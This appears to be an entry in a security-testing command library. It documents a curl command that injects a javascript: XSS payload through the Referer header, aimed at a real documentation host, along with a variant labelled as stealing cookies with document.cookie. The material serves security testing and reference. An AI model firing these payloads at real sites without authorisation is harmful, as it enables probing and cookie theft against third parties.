---
id: cmd-curl-malicious-referer-xss
data: >-
  curl -H "Referer: javascript:alert('XSS')" -X GET
  http://doc.owncloud.org/promote/ -v
tags:
  - xss
  - web
  - recon
type: command
output: >-
  HTTP/1.1 404 Not Found\n...\n<html>\n...\nThe referring page: <a
  href=\"javascript:alert('XSS')\">javascript:alert('XSS')</a>\n...
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.486Z'
verified: false
validated: true
submitted: true
---
# curl-malicious-referer-xss

## Command

```bash
curl -H "Referer: javascript:alert('XSS')" -X GET http://doc.owncloud.org/promote/ -v
```

## Description

This command uses curl to send a GET request to a non-existent endpoint on the target server, injecting a malicious javascript: URI into the Referer header to test for reflected XSS in the Apache 404 error page. The -v flag provides verbose output for inspecting the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Referer: ..."` | Sets the custom Referer header with the XSS payload | Yes |
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `http://doc.owncloud.org/promote/` | Target URL (non-existent path to trigger 404) | Yes |
| `-v` | Verbose mode to show headers and response details | No |

## Examples

### Basic Usage

```bash
curl -H "Referer: javascript:alert('XSS')" -X GET http://doc.owncloud.org/promote/
```

### Advanced Usage

```bash
curl -H "Referer: javascript:alert(document.cookie)" -X GET http://target.com/nonexistent -o response.html -v
```

This saves the response to a file for offline inspection and uses a payload to steal cookies.

## Expected Output

Verbose output showing request headers, 404 status, and HTML response with the reflected link: "The referring page: <a href=\"javascript:alert('XSS')\">javascript:alert('XSS')</a>". No alert triggers in curl itself; test by opening the response in a browser and clicking.

## Related

- [[Related Procedure|procedures/Exploit-Reflected-XSS-in-Referer-Header]]
